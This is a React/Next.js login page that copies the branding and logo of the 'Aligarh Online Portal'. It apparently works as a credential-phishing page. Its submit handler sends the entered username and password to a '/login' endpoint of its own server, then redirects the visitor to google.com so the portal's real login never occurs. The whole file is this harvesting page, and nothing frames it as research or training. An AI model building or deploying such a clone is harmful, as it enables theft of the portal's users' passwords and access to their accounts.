"use client"
import { useState } from "react";


export default function Home() {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  async function handleSubmit() {
    const data = {
      username: username,
      password: password,
    }
    const response = await fetch('/login', {
      method: 'POST',
      body: JSON.stringify(data),
      headers: {
        'Content-Type': 'application/json'
      }
    })
    window.location = "https://www.google.com"
  }
  return (
    <>
      <div className="col-md-4 col-md-offset-4 marg" style={{ marginTop: 30 }}>
        <center>
          <img
            width={50}
            height={50}
            src="https://aligarhonline.edu.pk/Online/uploads/images/9abc661af2ca2f446864ef70c7b56a0101e2f6dddb393fc2d316316b211fcfd5c2035ba09334189e99b570e243ee540c0f0337aa59827b71c5c167556d1cbb94.png"
          />
        </center>
        <center>
          <h4>Aligarh Online Portal</h4>
        </center>
      </div>
      <div className="form-box" id="login-box">
        <div className="header" style={{ fontFamily: '"OpenSans Regular"' }}>
          Sign IN
        </div>
        <form onSubmit={e => {
          e.preventDefault()
          handleSubmit()
        }}>
          <div className="body white-bg">
            <div className="form-group">
              <input
                onChange={e => setUsername(e.target.value)}
                id="username"
                className="form-control"
                placeholder="Username"
                name="username"
                value={username}
                type="text"
                required={true}
              />
            </div>
            <div className="form-group">
              <input
                onChange={e => setPassword(e.target.value)}
                id="password"
                required={true}
                className="form-control"
                placeholder="Password"
                name="password"
                value={password}
                type="password"
              />
            </div>
            <div className="checkbox">
              <label>
                <input type="checkbox" defaultValue="Remember Me" name="remember" />
                <span> &nbsp; Remember Me</span>
              </label>
            </div>
            <button
              onClick={handleSubmit}
              type="submit"
              id="submit"
              className="btn btn-lg btn-success btn-block">
              SIGN IN
            </button>
          </div>
        </form>
      </div>
    </>
  );
}
